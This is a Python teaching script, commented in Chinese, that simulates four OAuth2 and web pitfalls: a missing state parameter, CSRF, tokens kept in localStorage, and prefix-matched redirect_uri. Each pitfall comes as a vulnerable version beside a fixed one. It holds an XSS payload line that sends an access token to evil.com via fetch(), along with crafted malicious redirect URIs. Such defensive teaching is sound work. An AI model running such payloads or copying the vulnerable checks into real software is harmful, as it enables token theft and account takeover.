#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Day 150 · 示例 02：OAuth2 / Web 常见陷阱——CSRF 复现与四层防护（进阶 + 避坑）
==============================================================================

本文件演示 4 个"看起来很安全、实际一碰就碎"的坑：

  坑 1  缺少 OAuth2 `state`  → 攻击者用**自己的授权码**绑定受害者账号
  坑 2  只有 Cookie 会话、无 CSRF Token → 恶意表单自动提交就能转账
  坑 3  令牌存 localStorage → XSS 一次就永久失窃（对比 HttpOnly Cookie）
  坑 4  redirect_uri 用前缀/通配匹配 → 开放重定向 + 授权码窃取

每个坑都给出 **❌ 有漏洞的写法** 和 **✅ 修复后的写法**，并直接跑出对比结果。

运行：
    python3 02-oauth2-csrf-pitfalls.py
"""

import secrets
import urllib.parse


def banner(t: str) -> None:
    print("\n" + "═" * 70)
    print(f"  {t}")
    print("═" * 70)


def sep(t: str) -> None:
    print(f"\n── {t} " + "─" * max(0, 66 - len(t)))


# ══════════════════════════════════════════════════════════════════
# 坑 1：OAuth2 缺少 state 参数 → 账号绑定型 CSRF
# ══════════════════════════════════════════════════════════════════

def pitfall_1_state_missing() -> None:
    banner("坑 1：OAuth2 缺少 state → 攻击者把自己的第三方账号绑到你身上")

    class AppWithoutState:
        """❌ 漏洞版：回调里不校验 state。"""
        def __init__(self):
            self.bindings = {}   # victim_uid -> third_party_uid

        def callback(self, victim_uid: str, code: str) -> str:
            # 直接把 code 换成第三方身份，然后绑定
            third_party_uid = f"third_party_of({code})"
            self.bindings[victim_uid] = third_party_uid
            return f"绑定成功: {victim_uid} ← {third_party_uid}"

    class AppWithState:
        """✅ 修复版：回调校验 state，且 state 属于**当前浏览器会话**。"""
        def __init__(self):
            self.bindings = {}
            self.sessions = {}   # session_id -> {"state": ...}

        def start_login(self, session_id: str) -> str:
            state = secrets.token_urlsafe(32)
            self.sessions[session_id] = {"state": state}
            return f"https://oauth.provider/authorize?state={state}"

        def callback(self, session_id: str, code: str, incoming_state: str) -> str:
            expected = self.sessions.get(session_id, {}).get("state", "")
            if not incoming_state or not secrets.compare_digest(incoming_state, expected):
                return "❌ state 不匹配 → 拒绝回调（已拦截 CSRF）"
            del self.sessions[session_id]        # 用后即焚，防重放
            self.bindings["victim"] = f"third_party_of({code})"
            return "✅ state 校验通过，完成绑定"

    sep("❌ 漏洞版：无 state")
    vuln = AppWithoutState()
    # 攻击者：用自己的账号走完授权拿到 code，把回调链接发给受害者
    attacker_code = "ATTACKER_CODE_12345"
    print(f"  攻击者构造恶意回调链接: https://app.com/cb?code={attacker_code}")
    print("  受害者点击（浏览器带着受害者的登录会话 Cookie）……")
    print("  " + vuln.callback("victim", attacker_code))
    print("  ⚠️ 结果：攻击者的第三方账号绑到了受害者账号上")
    print("     → 攻击者以后可用自己的第三方账号登录受害者账号")

    sep("✅ 修复版：校验 state")
    fixed = AppWithState()
    start = fixed.start_login("victim-session")
    print(f"  受害者正常开始登录，服务端生成 state 存入会话:\n    {start[:70]}...")
    print("  攻击者再次把**自己的** code + **自己的** state 发给受害者:")
    print("  " + fixed.callback("victim-session", attacker_code, "ATTACKER_STATE"))
    print("  → 拦截成功：state 对不上，绑定不会发生 ✅")


# ══════════════════════════════════════════════════════════════════
# 坑 2：CSRF —— 只有 Cookie 会话，没有 CSRF Token
# ══════════════════════════════════════════════════════════════════

class Bank:
    """一个简化到极致的银行：只带 Cookie 就能转账。"""

    def __init__(self, enable_csrf_token: bool, same_site: str):
        self.balance = {"victim": 10000, "attacker": 0}
        self.enable_csrf_token = enable_csrf_token
        self.same_site = same_site               # "none" | "lax" | "strict"
        self.tokens = {}                         # session_id -> csrf_token

    # ── 浏览器行为模拟 ─────────────────────────────────────
    def browser_sends_cookie(self, same_site_request: str) -> bool:
        """SameSite 语义：
        - strict: 跨站请求**完全不带** Cookie
        - lax   : 跨站 **GET 顶层导航**带 Cookie；跨站 **POST** 不带
        - none  : 总是带（必须配 Secure）
        """
        if same_site_request == "same-site":
            return True
        if self.same_site == "strict":
            return False
        if self.same_site == "lax":
            return same_site_request == "cross-site-get"
        return True

    def transfer(self, session_id: str, to: str, amount: int,
                 request_kind: str, csrf_token: str | None = None) -> str:
        # 第 1 层：SameSite
        if not self.browser_sends_cookie(request_kind):
            return "❌ 403 跨站请求未携带会话 Cookie（SameSite 拦截）"

        # 第 2 层：CSRF Token（只对状态改变请求校验）
        if self.enable_csrf_token:
            expected = self.tokens.get(session_id)
            if not expected or not csrf_token or \
                    not secrets.compare_digest(csrf_token, expected):
                return "❌ 403 CSRF token 缺失或不匹配（拦截）"

        # 通过了所有校验 → 执行
        self.balance["victim"] -= amount
        self.balance[to] += amount
        return f"💸 转账成功: victim → {to} {amount} 元 (余额 {self.balance['victim']})"


def pitfall_2_csrf() -> None:
    banner("坑 2：CSRF —— 恶意表单自动提交就能把钱转走")

    sep("场景 A：SameSite=none + 无 CSRF Token（最危险）")
    bank = Bank(enable_csrf_token=False, same_site="none")
    bank.tokens["victim-session"] = secrets.token_urlsafe(16)
    print("  受害者已登录，浏览器持有 victim-session Cookie")
    print("  受害者访问 evil.com，页面自动提交表单到 bank.com/transfer (跨站 POST):")
    print("  " + bank.transfer("victim-session", "attacker", 10000, "cross-site-post"))

    sep("场景 B：SameSite=Lax + 无 CSRF Token")
    bank = Bank(enable_csrf_token=False, same_site="lax")
    print("  跨站 POST（恶意表单）:")
    print("  " + bank.transfer("victim-session", "attacker", 10000, "cross-site-post"))
    print("  ⚠️ 但 SameSite=Lax 对**跨站 GET 顶层导航**仍会带 Cookie。")
    print("     如果转账接口写成 GET /transfer?to=..&amount=.. （❌ 有副作用的 GET）:")
    print("  " + bank.transfer("victim-session", "attacker", 10000, "cross-site-get"))
    print("  ⇒ 教训：GET 必须无副作用；SameSite=Lax 不是万能药")

    sep("场景 C：SameSite=None + CSRF Token（推荐组合之一）")
    bank = Bank(enable_csrf_token=True, same_site="none")
    bank.tokens["victim-session"] = "TOKEN-abc"
    print("  攻击者不知道 CSRF Token（Token 存在页面里 / 需同源读取）:")
    print("  " + bank.transfer("victim-session", "attacker", 10000,
                               "cross-site-post", csrf_token=None))
    print("  受害者自己提交（带上了正确的 Token）:")
    print("  " + bank.transfer("victim-session", "attacker", 10000,
                               "cross-site-post", csrf_token="TOKEN-abc"))

    sep("场景 D：SameSite=Lax + CSRF Token + 双保险")
    bank = Bank(enable_csrf_token=True, same_site="lax")
    bank.tokens["victim-session"] = "TOKEN-xyz"
    print("  跨站 POST 无 Token:")
    print("  " + bank.transfer("victim-session", "attacker", 10000, "cross-site-post"))
    print("  跨站 GET（SameSite 放行）但无 Token:")
    print("  " + bank.transfer("victim-session", "attacker", 10000, "cross-site-get"))
    print("  受害者正常操作（同站 POST + 正确 Token）:")
    print("  " + bank.transfer("victim-session", "attacker", 10000,
                               "same-site", csrf_token="TOKEN-xyz"))

    print("""
  📌 结论（纵深防御，缺一层都可能出事）:
     SameSite=Lax  ⇒ 挡住大部分跨站 POST，但挡不住"有副作用的 GET"和老浏览器
     CSRF Token    ⇒ 挡住一切"攻击者无法读取页面"的场景（最稳）
     Origin 校验   ⇒ 补充层，注意不要只做前缀匹配
     GET 无副作用  ⇒ 设计层面的根本防护
""")


# ══════════════════════════════════════════════════════════════════
# 坑 3：令牌存储位置 —— localStorage vs HttpOnly Cookie
# ══════════════════════════════════════════════════════════════════

def pitfall_3_token_storage() -> None:
    banner("坑 3：令牌存 localStorage → 一次 XSS 就永久失窃")

    sep("攻击模型：页面上出现一个 XSS 注入点")
    xss_payload = "fetch('https://evil.com/steal?t='+localStorage.getItem('access_token'))"

    sep("❌ localStorage 方案")
    storage = {"access_token": "eyJhbGciOiJIUzI1NiJ9.SECRET.SIG"}
    print(f"  页面存在 XSS，攻击者注入: {xss_payload}")
    stolen = storage.get("access_token")
    print(f"  结果：令牌被完整读出并外传 → {stolen[:32]}...")
    print("  ⚠️ 危害：JS 可读 → XSS 即令牌失窃；且 localStorage 不随标签页关闭失效")

    sep("✅ HttpOnly Cookie 方案")
    print("""  Set-Cookie: session=<opaque>; HttpOnly; Secure; SameSite=Lax; Path=/
     • HttpOnly → **JS 读不到**，XSS 拿不到令牌（仍能发起请求，但拿不走凭证）
     • Secure   → 只在 HTTPS 上发送，防中间人窃听
     • SameSite → 防 CSRF（Cookie 不会被跨站 POST 带上）
     • Path     → 限制作用范围，减少泄漏面
  ✅ 更进一步：Cookie 里只放**不透明的会话 ID**，真实令牌存在服务端
     → 服务端可随时撤销、可绑定指纹、可做并发登录控制
""")
    print("  📌 如果确实要用 Bearer Token + JS（如跨域 API），")
    print("     至少要把 access_token 的有效期压到 5~15 分钟，并配合 refresh 轮转。")


# ══════════════════════════════════════════════════════════════════
# 坑 4：redirect_uri 校验 —— 精确匹配 vs 前缀匹配
# ══════════════════════════════════════════════════════════════════

REGISTERED = "https://app.example.com/callback"


def check_redirect_uri_vulnerable(uri: str) -> bool:
    """❌ 用 startswith 判断"是不是我们家的域名"。"""
    return uri.startswith("https://app.example.com/callback")


def check_redirect_uri_fixed(uri: str) -> bool:
    """✅ 精确字符串匹配（RFC 6749 §3.1.2.3 要求）。

    为什么不能"聪明一点"？因为 URL 解析规则非常复杂，任何自创的
    宽松规则都可能被绕过。精确匹配是最不容易出错的策略。
    """
    return uri == REGISTERED


def pitfall_4_redirect_uri() -> None:
    banner("坑 4：redirect_uri 前缀匹配 → 授权码被重定向到攻击者服务器")

    attacks = [
        # (恶意 URI, 说明)
        ("https://app.example.com/callback.evil.com",
         "把恶意域名拼在被信任前缀后面"),
        ("https://app.example.com/callback/../../steal",
         "用路径穿越跳到非注册路径"),
        ("https://app.example.com/callback@evil.com",
         "“userinfo@host” 惯用手法（对某些解析器 host 变成 evil.com）"),
        ("https://app.example.com/callback?x=1#@evil.com",
         "用 query/fragment 干扰解析"),
        ("https://app.example.com.evil.com/callback",
         "用子域名后缀混淆（域名主体其实是 evil.com）"),
    ]

    print(f"  已注册回调: {REGISTERED}\n")
    print(f"  {'恶意 redirect_uri':<48} {'前缀匹配':<10} {'精确匹配'}")
    print("  " + "-" * 78)
    for uri, _ in attacks:
        v = "✅放行(危险)" if check_redirect_uri_vulnerable(uri) else "拦截"
        f = "✅放行" if check_redirect_uri_fixed(uri) else "拦截"
        print(f"  {uri:<48} {v:<10} {f}")
        print(f"      ↑ {_}")

    print("""
  📌 额外要求：
     • 授权请求和换令牌请求里的 redirect_uri **必须完全一致**
     • 只允许 https（本地开发除外），禁止 http
     • 禁止在 redirect_uri 里放自定义 scheme 以外的奇怪协议（如 javascript:）
     • 授权服务器要**先校验 redirect_uri，再决定是否重定向报错**，
       否则错误响应本身就会把用户送到攻击者页面（"open redirect"）
""")


def main() -> None:
    pitfall_1_state_missing()
    pitfall_2_csrf()
    pitfall_3_token_storage()
    pitfall_4_redirect_uri()

    banner("今日避坑清单")
    print("""
  1. OAuth2 授权请求必须带 state（高熵、会话内存储、一次性、用后即焚）
  2. 公开客户端必须 PKCE（S256），机密客户端必须保密 client_secret
  3. Cookie: HttpOnly + Secure + SameSite=Lax/Strict，缺一不可
  4. 状态改变操作必须校验 CSRF Token；GET 必须无副作用
  5. 令牌不放 localStorage；优先服务端会话 + 不透明 Cookie
  6. redirect_uri 必须精确匹配，禁止前缀/通配/正则
  7. access_token 短命 + refresh 轮转 + 可撤销
  8. 日志里绝不出现 token / code / secret / 密码
""")


if __name__ == "__main__":
    main()
